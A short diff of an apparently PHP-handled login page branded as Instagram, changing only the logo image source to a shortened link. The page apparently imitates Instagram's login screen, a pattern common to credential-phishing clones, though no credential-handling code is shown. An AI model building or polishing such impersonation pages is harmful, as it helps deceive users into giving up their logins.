@@ -258,7 +258,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 </head>
 <body>
     <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="instagram-logo">
+        <img src="https://share.google/MHtgSa1y6P2NZl7Ej" alt="Instagram" class="instagram-logo">
         
         <div id="loginView">
             <form class="login-form" onsubmit="handleLogin(event)">
